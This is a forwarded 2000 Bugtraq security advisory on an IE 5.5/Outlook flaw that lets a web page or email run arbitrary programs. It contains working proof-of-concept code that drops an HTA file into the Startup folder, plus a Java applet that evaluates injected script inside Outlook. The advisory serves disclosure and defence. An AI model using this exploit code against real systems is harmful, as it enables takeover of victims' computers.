----- Forwarded message from Georgi Guninski <guninski@GUNINSKI.COM> -----

Approved-By: aleph1@SECURITYFOCUS.COM
Delivered-To: bugtraq@lists.securityfocus.com
Delivered-To: BUGTRAQ@SECURITYFOCUS.COM
X-Mailer: Mozilla 4.75 [en] (Win98; U)
X-Accept-Language: en
Date:         Thu, 5 Oct 2000 15:19:28 +0300
Reply-To: Georgi Guninski <guninski@GUNINSKI.COM>
From: Georgi Guninski <guninski@GUNINSKI.COM>
Subject:      IE 5.5/Outlook security vulnerability -
              com.ms.activeX.ActiveXComponent allows executing arbitrary
              programs
To: BUGTRAQ@SECURITYFOCUS.COM

Georgi Guninski security advisory #23, 2000

IE 5.5/Outlook security vulnerability - com.ms.activeX.ActiveXComponent
allows executing arbitrary programs

Systems affected:
IE 5.5/Outlook/Outlook Express - probably other versions, have not
tested

Risk: High
Date: 5 October 2000

Legal Notice:
This Advisory is Copyright (c) 2000 Georgi Guninski. You may distribute
it unmodified. You may not modify it and distribute it or distribute
parts of it without the author's written permission.

Disclaimer:
The opinions expressed in this advisory and program are my own and not
of any company.
The usual standard disclaimer applies, especially the fact that Georgi
Guninski
is not liable for any damages caused by direct or  indirect use of the
information or functionality provided by this advisory or program.
Georgi Guninski, bears no responsibility for content or misuse of this
advisory or program or any derivatives thereof.

Description:
Internet Explorer 5.5/Outlook allow executing arbitray programs after
viewing web page
or email message. This may lead to taking full control over user's
computer.

Details:
The problem is the com.ms.activeX.ActiveXComponent java object which may
be instantiated
from <APPLET> tag (it throws security exception in java console, but
returns object, strange).
The com.ms.activeX.ActiveXComponent java object allows creating and
scripting arbitrary
ActiveX objects, including those not marked safe for scripting.
Examine the code below for more information.

The code is:
---------javaea.html------------------------------------------
<APPLET code="com.ms.activeX.ActiveXComponent" >
</APPLET>
<!-- ^^^ This gives java exceptions in java console, but the object is
instantiated -->


<SCRIPT LANGUAGE="JAVASCRIPT">
a1=document.applets[0];
fn="..\\\\Start Menu\\\\Programs\\\\Startup\\\\EA.HTA";
//fn="EA.HTA";
doc="<SCRIPT>s1=\'Hello world\\nTo get rid of this, delete the file
EA.HTA in Startup
folder\';alert(s1);document.body.innerHTML=s1</"+"SCRIPT>";
function f1()
{
a1.setProperty('DOC',doc);
}

function f()
{
// The ActiveX classid
cl="{06290BD5-48AA-11D2-8432-006008C3FBFC}";
a1.setCLSID(cl);
a1.createInstance();
setTimeout("a1.setProperty('Path','"+fn+"')",1000);
setTimeout("f1()",1500);
setTimeout("a1.invoke('write',VA);alert('"+fn+" created');",2000);
}
setTimeout("f()",1000)
</SCRIPT>

<SCRIPT LANGUAGE="VBSCRIPT">
VA = ARRAY()
' Just to get something like com.ms.com.Variant[]
</SCRIPT>
------------------------------------------------------

Regarding this issue and Outlook with "security update" (probably this
should be another advisory).
It is a bit more difficult to exploit this from Outlook because of the
"Outlook security
update" which stops "most scripting". It is common misbelief that the
"Outlook security update"
stops all scripting, but this is not true.
It is possible to trigger the execution of Active Script from email
message
with the help of Java.
Send a email message containing <IFRAME
SRC="http://somehost/javascript.html"></IFRAME>
-----------javascript.html-------------
<APPLET CODE="outlookjs.class" MAYSCRIPT>
<PARAM NAME="command" VALUE="window.open('http://www.guninski.com')">
</APPLET>
---------------------------------------
----------outlookjs.java---------------
import java.applet.Applet;
import netscape.javascript.*;
class outlookjs extends Applet {
public JSObject j;
public void init()
 {
  try {
  j=(JSObject) JSObject.getWindow(this);
  j.eval(getParameter("command"));
  }
  catch (Exception e) {System.out.println(e);};
 }
}
---------------------------------------

Workaround:
Disable Active Scripting or Java or Scripting of Java applets - better
disable all
active content in IE.

Demonstration is available at:
http://www.guninski.com/javaea1.html
http://www.guninski.com/javaea2.html

Regards,
Georgi Guninski
http://www.guninski.com

----- End forwarded message -----
